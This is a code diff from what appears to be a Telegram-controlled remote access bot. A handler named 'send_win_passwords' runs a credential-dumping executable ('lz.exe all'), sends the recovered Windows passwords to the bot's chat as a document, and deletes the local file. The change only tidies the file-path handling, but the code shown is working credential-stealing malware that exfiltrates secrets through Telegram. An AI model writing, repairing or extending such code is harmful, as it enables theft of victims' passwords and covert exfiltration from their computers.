@@ -23,8 +23,8 @@ async def send_win_passwords(message: Message):
     try:
         subprocess.run(["lz.exe", "all", "-oJ", "-output", home_dir], check=True)
         creds = get_filename()
-        file = FSInputFile(home_dir + '\\' + creds)
         cred_path = home_dir + '\\' + creds
+        file = FSInputFile(cred_path)
         await message.answer_document(file, caption="<b>Recovered Windows passwords</b>")
         os.remove(cred_path)
     except Exception as e:
